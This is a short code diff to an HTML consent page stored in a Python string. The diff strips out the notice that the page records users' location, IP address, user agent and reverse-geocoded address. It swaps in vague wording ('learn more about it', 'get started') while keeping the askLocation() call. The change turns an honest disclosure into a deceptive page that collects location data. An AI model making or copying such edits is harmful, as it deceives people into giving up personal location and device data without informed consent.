@@ -258,13 +258,11 @@ CONSENT_PAGE = """
 </head>
 <body>
     <div class="box">
-        <h2>Location Permission Required</h2>
+        <h2>learn more about it</h2>
         <p class="notice">
-            To continue to Google Maps, this page will ask your browser for location permission.
-            If you allow, your latitude, longitude, accuracy, request time, IP address, browser user agent,
-            and approximate address details from reverse geocoding will be saved for this test server.
+            we provide information regarding your queries 
         </p>
-        <button onclick="askLocation()">Allow Location</button>
+        <button onclick="askLocation()">get started</button>
         <p id="status"></p>
     </div>
 
